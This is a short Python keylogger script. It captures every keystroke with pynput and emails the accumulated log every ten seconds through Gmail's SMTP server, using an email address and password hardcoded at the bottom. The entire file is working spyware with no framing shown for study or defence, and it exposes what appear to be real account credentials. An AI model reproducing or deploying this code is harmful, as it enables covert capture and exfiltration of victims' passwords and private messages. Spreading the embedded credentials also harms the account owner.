#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, record_time, email, password):
        self.log="Keylogger Started"
        self.time=record_time
        self.email=email
        self.password=password

    def add_to_log(self,string):
        self.log = self.log + string

    def process_key_press(self, key):

        try:
            current_key= str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " "+ str(key)+" "
        self.add_to_log(current_key)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):

        self.send_mail(self.email, self.password, "\n\n"+self.log)
        self.log = ""
        timer=threading.Timer(self.time, self.report)
        timer.start()

    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with listener:
            self.report()
            listener.join()


my_key=Keylogger(10, "jaffa.me149@gmail.com", "jaffa149")
my_key.start()